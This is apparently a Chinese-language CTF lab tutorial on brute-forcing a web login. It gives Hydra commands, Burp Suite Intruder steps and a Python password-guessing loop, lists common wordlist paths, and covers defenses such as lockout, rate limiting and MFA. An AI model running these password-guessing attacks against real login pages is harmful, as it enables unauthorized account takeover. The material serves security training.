# 暴力破解

## 概述

暴力破解（Brute Force）通过尝试大量用户名和密码组合来破解认证。

## 工具

### Hydra

```bash
# 基本用法
hydra -l admin -P passwords.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# 使用用户名字典
hydra -L users.txt -P passwords.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

### Burp Suite Intruder

1. 拦截登录请求
2. 发送到 Intruder
3. 标记用户名和密码位置
4. 加载字典
5. 开始攻击
6. 根据响应长度或状态码判断成功

### Python 脚本

```python
import requests

with open('passwords.txt') as f:
    passwords = f.read().splitlines()

for password in passwords:
    r = requests.post('http://target.com/login', data={
        'username': 'admin',
        'password': password
    })
    if 'Invalid' not in r.text:
        print(f'Found: {password}')
        break
```

## 常见字典

```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/fasttrack.txt
/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt
```

## 防御措施

1. **账户锁定** — 多次失败后锁定账户
2. **验证码** — 增加自动化难度
3. **限流** — 限制请求频率
4. **强密码** — 要求复杂密码
5. **多因素认证** — 增加额外验证

## 练习步骤

1. 尝试手动登录 — 失败
2. 使用 Burp Suite 拦截请求
3. 使用 Intruder 暴力破解
4. 找到正确密码并登录

## flag

登录成功后在页面中查找 `CR{...}` 格式的 flag。
